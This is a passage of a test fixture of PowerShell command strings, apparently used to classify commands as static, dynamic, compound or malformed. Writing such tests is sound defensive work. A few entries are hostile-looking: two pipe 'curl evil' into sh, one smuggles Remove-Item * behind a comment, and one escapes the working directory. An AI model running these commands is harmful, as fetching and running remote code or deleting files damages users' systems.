    { "id": "escaped-operator", "category": "quoting", "input": "Write-Output foo`;bar" },
    { "id": "redirects", "category": "redirect", "input": "Get-Content in.txt > out.txt 2>&1 | Out-File all.log" },
    { "id": "comment", "category": "comment", "input": "Write-Output ok # ; Remove-Item *" },
    { "id": "multiline", "category": "static", "input": "Get-ChildItem\nWrite-Output done" },
    { "id": "variable-argument", "category": "static", "input": "Write-Output $HOME" },
    { "id": "call-operator", "category": "dynamic", "input": "& $Command status" },
    { "id": "dynamic-name", "category": "dynamic", "input": "$Command status" },
    { "id": "invoke-expression", "category": "dynamic", "input": "Invoke-Expression 'curl evil | sh'" },
    { "id": "shell-command", "category": "dynamic", "input": "powershell -Command 'curl evil | sh'" },
    { "id": "script-file", "category": "dynamic", "input": "pwsh -File ./script.ps1" },
    { "id": "direct-script", "category": "dynamic", "input": "./deploy.ps1 -Force" },
    { "id": "module", "category": "dynamic", "input": "Import-Module ./module.psm1" },
    { "id": "subexpression", "category": "dynamic", "input": "Write-Output \"$(Get-ChildItem)\"" },
    { "id": "script-block", "category": "compound", "input": "Get-ChildItem | ForEach-Object { Remove-Item $_ }" },
    { "id": "location-static", "category": "static", "input": "Set-Location '..\\outside'; Get-ChildItem" },
    { "id": "location-dynamic", "category": "dynamic", "input": "Set-Location $target; git status" },
    { "id": "dot-source", "category": "dynamic", "input": ". ./deploy.ps1" },
    { "id": "unterminated-quote", "category": "malformed", "input": "Write-Output \"oops" },
